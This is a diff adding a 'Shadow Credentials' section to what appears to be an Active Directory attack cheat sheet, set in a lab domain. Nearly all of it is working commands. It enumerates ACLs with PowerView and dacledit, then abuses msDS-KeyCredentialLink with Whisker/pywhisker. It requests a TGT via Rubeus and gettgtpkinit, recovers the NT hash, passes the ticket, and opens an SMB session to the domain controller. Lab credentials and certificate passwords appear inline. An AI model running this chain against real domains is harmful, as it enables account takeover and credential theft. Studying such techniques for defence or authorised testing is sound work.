@@ -214,3 +214,49 @@ Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose
 
 Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
 ```
+
+## Shadow Credentials
+- msDS-KeyCredentialLink
+- GenericAll
+- GenericWrite
+- WriteProperty
+- AddKeyCredentialLink
+
+### Enumeration
+```powershell
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
+Import-Module .\PowerView.ps1
+
+$userSID = (Get-DomainUser -Identity jeffry).objectsid
+
+Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}
+```
+```bash
+python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip 10.129.228.236 lab.local/jeffry:Music001
+```
+
+### Abusing
+```powershell
+.\Whisker.exe list /target:gabriel
+
+.\Whisker.exe add /target:gabriel
+
+.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
+
+.\Rubeus.exe createnetonly /program:powershell.exe /show
+
+.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
+
+# clear
+.\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8
+```
+```bash
+python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add
+
+python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache
+
+KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel
+
+KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
+```
